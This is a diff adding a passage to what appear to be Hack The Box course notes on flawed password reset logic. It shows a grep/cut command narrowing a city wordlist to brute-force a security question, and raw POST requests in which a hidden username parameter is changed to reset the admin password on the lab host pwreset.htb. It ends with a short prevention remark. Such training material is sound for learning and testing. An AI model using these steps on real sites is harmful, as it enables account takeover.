@@ -55,3 +55,81 @@ $ ffuf -w ./city_wordlist.txt -u http://pwreset.htb/security_question.php -X POS
 After obtaining the security response, we can reset the admin user's password and entirely take over the account:
 
 <figure><img src="../../../../.gitbook/assets/image (503).png" alt=""><figcaption></figcaption></figure>
+
+We could narrow down the cities if we had additional information on our target to reduce the time required for our brute-force attack on the security question. For instance, if we knew that our target user was from Germany, we could create a wordlist containing only German cities, reducing the number to about a thousand cities:
+
+```shell-session
+al1abb@htb[/htb]$ cat world-cities.csv | grep Germany | cut -d ',' -f1 > german_cities.txt
+
+al1abb@htb[/htb]$ wc -l german_cities.txt 
+
+1117 german_cities.txt
+```
+
+***
+
+## Manipulating the Reset Request
+
+Another instance of a flawed password reset logic occurs when a user can manipulate a potentially hidden parameter to reset the password of a different account.
+
+For instance, consider the following password reset flow, which is similar to the one discussed above. First, we specify the username:
+
+<figure><img src="../../../../.gitbook/assets/image (504).png" alt=""><figcaption></figcaption></figure>
+
+We will use our demo account `htb-stdnt`, which results in the following request:
+
+```http
+POST /reset.php HTTP/1.1
+Host: pwreset.htb
+Content-Length: 18
+Content-Type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv
+
+username=htb-stdnt
+```
+
+Afterward, we need to supply the response to the security question:
+
+<figure><img src="../../../../.gitbook/assets/image (505).png" alt=""><figcaption></figcaption></figure>
+
+Supplying the security response `London` results in the following request:
+
+```http
+POST /security_question.php HTTP/1.1
+Host: pwreset.htb
+Content-Length: 43
+Content-Type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv
+
+security_response=London&username=htb-stdnt
+```
+
+As we can see, the username is contained in the form as a hidden parameter and sent along with the security response. Finally, we can reset the user's password:
+
+<figure><img src="../../../../.gitbook/assets/image (506).png" alt=""><figcaption></figcaption></figure>
+
+The final request looks like this:
+
+```http
+POST /reset_password.php HTTP/1.1
+Host: pwreset.htb
+Content-Length: 36
+Content-Type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv
+
+password=P@$$w0rd&username=htb-stdnt
+```
+
+Like the previous request, the request contains the username in a separate POST parameter. Suppose the web application does properly verify that the usernames in both requests match. In that case, we can skip the security question or supply the answer to our security question and then set the password of an entirely different account. For instance, we can change the admin user's password by manipulating the `username` parameter of the password reset request:
+
+```http
+POST /reset_password.php HTTP/1.1
+Host: pwreset.htb
+Content-Length: 32
+Content-Type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv
+
+password=P@$$w0rd&username=admin
+```
+
+To prevent this vulnerability, keeping a consistent state during the entire password reset process is essential. Resetting an account's password is a sensitive process where minor implementation flaws or logic bugs can enable an attacker to take over other users' accounts. As such, we should investigate the password reset functionality of any web application closely and keep an eye out for potential security issues.
